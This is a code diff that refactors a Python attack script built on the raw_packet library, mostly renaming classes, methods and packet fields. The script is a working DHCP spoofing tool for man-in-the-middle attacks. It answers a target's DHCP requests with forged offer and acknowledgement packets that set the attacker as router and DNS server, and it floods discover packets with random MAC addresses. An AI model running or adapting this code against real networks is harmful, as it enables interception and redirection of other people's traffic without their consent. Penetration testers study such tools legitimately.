@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
 # region Description
@@ -20,7 +20,7 @@ path.append(dirname(dirname(dirname(abspath(__file__)))))
 
 # region Raw-packet modules
 from raw_packet.Utils.base import Base
-from raw_packet.Utils.network import Ethernet_raw, ARP_raw, IP_raw, UDP_raw, DHCP_raw
+from raw_packet.Utils.network import RawEthernet, RawARP, RawIPv4, RawUDP, RawDHCPv4
 from raw_packet.Utils.tm import ThreadManager
 # endregion
 
@@ -68,11 +68,11 @@ if not args.quiet:
 # endregion
 
 # region Set global variables
-eth = Ethernet_raw()
-arp = ARP_raw()
-ip = IP_raw()
-udp = UDP_raw()
-dhcp = DHCP_raw()
+eth: RawEthernet = RawEthernet()
+arp: RawARP = RawARP()
+ip: RawIPv4 = RawIPv4()
+udp: RawUDP = RawUDP()
+dhcp: RawDHCPv4 = RawDHCPv4()
 
 target_mac_address = str(args.target_mac).lower()
 target_ip_address = str(args.target_ip)
@@ -85,12 +85,12 @@ print_success_mitm = False
 # region Get your network settings
 if args.interface is None:
     Base.print_warning("Please set a network interface for sniffing ARP and DHCP requests ...")
-current_network_interface = Base.netiface_selection(args.interface)
+current_network_interface = Base.network_interface_selection(args.interface)
 
-your_mac_address = Base.get_netiface_mac_address(current_network_interface)
-your_ip_address = Base.get_netiface_ip_address(current_network_interface)
-your_netmask = Base.get_netiface_netmask(current_network_interface)
-your_broadcast = Base.get_netiface_broadcast(current_network_interface)
+your_mac_address = Base.get_interface_mac_address(current_network_interface)
+your_ip_address = Base.get_interface_ip_address(current_network_interface)
+your_netmask = Base.get_interface_netmask(current_network_interface)
+your_broadcast = Base.get_interface_broadcast(current_network_interface)
 # endregion
 
 # region Create raw socket
@@ -103,12 +103,13 @@ SOCK.bind((current_network_interface, 0))
 def make_dhcp_offer_packet(transaction_id, destination_ip=None):
     if destination_ip is None:
         destination_ip = "255.255.255.255"
-    return dhcp.make_response_packet(source_mac=your_mac_address,
-                                     destination_mac=target_mac_address,
-                                     source_ip=your_ip_address,
-                                     destination_ip=destination_ip,
+    return dhcp.make_response_packet(ethernet_src_mac=your_mac_address,
+                                     ethernet_dst_mac=target_mac_address,
+                                     ip_src=your_ip_address,
+                                     ip_dst=destination_ip,
                                      transaction_id=transaction_id,
-                                     your_ip=target_ip_address,
+                                     your_client_ip=target_ip_address,
+                                     dhcp_message_type=2,
                                      client_mac=target_mac_address,
                                      dhcp_server_id=your_ip_address,
                                      lease_time=600,
@@ -122,19 +123,19 @@ def make_dhcp_offer_packet(transaction_id, destination_ip=None):
 def make_dhcp_ack_packet(transaction_id, destination_ip=None):
     if destination_ip is None:
         destination_ip = "255.255.255.255"
-    return dhcp.make_response_packet(source_mac=your_mac_address,
-                                     destination_mac=target_mac_address,
-                                     source_ip=your_ip_address,
-                                     destination_ip=destination_ip,
+    return dhcp.make_response_packet(ethernet_src_mac=your_mac_address,
+                                     ethernet_dst_mac=target_mac_address,
+                                     ip_src=your_ip_address,
+                                     ip_dst=destination_ip,
                                      transaction_id=transaction_id,
-                                     your_ip=target_ip_address,
+                                     your_client_ip=target_ip_address,
                                      client_mac=target_mac_address,
                                      dhcp_server_id=your_ip_address,
                                      lease_time=600,
                                      netmask=your_netmask,
                                      router=your_ip_address,
                                      dns=your_ip_address,
-                                     dhcp_operation=5)
+                                     dhcp_message_type=5)
 # endregion
 
 
@@ -148,7 +149,7 @@ def dhcp_response_sender():
 
     while True:
         discover_packet = dhcp.make_discover_packet(ethernet_src_mac=your_mac_address,
-                                                    client_mac=eth.get_random_mac(),
+                                                    client_mac=eth.make_random_mac(),
                                                     host_name=Base.make_random_string(6))
         SOCK.send(discover_packet)
         SOCK.send(offer_packet)
@@ -172,21 +173,21 @@ def reply(request):
     # endregion
 
     # region DHCP REQUESTS
-    if 'DHCP' in request.keys():
+    if 'DHCPv4' in request.keys():
 
         # region Get DHCP transaction id
         transaction_id = request['BOOTP']['transaction-id']
         # endregion
 
         # region DHCP DECLINE
-        if request['DHCP'][53] == 4:
+        if request['DHCPv4'][53] == 4:
             Base.print_info("DHCP DECLINE from: ", target_mac_address, " transaction id: ", hex(transaction_id))
             if transaction_id_global != 0:
                 tm.add_task(dhcp_response_sender)
         # endregion
 
         # region DHCP REQUEST
-        if request['DHCP'][53] == 3:
+        if request['DHCPv4'][53] == 3:
 
             # region Get next DHCP transaction id
             if transaction_id != 0:
@@ -196,8 +197,8 @@ def reply(request):
             # endregion
 
             # region Get DHCP requested ip address
-            if 50 in request['DHCP'].keys():
-                requested_ip = str(request['DHCP'][50])
+            if 50 in request['DHCPv4'].keys():
+                requested_ip = str(request['DHCPv4'][50])
             # endregion
 
             # region Print info message
